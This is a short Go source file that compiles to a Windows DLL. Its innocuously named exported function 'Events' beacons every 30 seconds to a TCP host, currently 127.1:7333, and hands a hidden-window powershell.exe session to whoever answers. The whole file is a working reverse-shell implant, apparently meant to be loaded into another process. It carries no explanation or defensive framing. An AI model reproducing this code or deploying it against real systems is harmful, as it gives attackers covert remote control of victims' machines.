package main

import "C"
import (
	"log"
	"net"
	"os/exec"
	"syscall"
	"time"
)

const (
	host = "127.1:7333"
	bin  = "powershell.exe"
)

/* functions to export as a dll */

//export Events
func Events() {
	dialer := net.Dialer{
		Timeout: 10 * time.Second,
	}
	for {
		time.Sleep(30 * time.Second)
		conn, err := dialer.Dial("tcp", host)
		if err != nil {
			log.Println(err)
			log.Println("retrying and sleeping")
			continue
		}

		cmd := exec.Command(bin)

		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}

		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		if err := cmd.Run(); err != nil {
			log.Println(err)
		}

	}
}

func main() {}
